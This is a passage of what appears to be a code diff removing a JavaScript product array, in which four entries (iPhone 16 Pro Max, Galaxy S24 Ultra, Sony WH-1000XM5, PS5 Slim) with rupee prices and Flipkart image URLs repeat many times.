-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                   ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-               ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-               ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-               ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                   ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-            },
-            {
-              
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                   ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
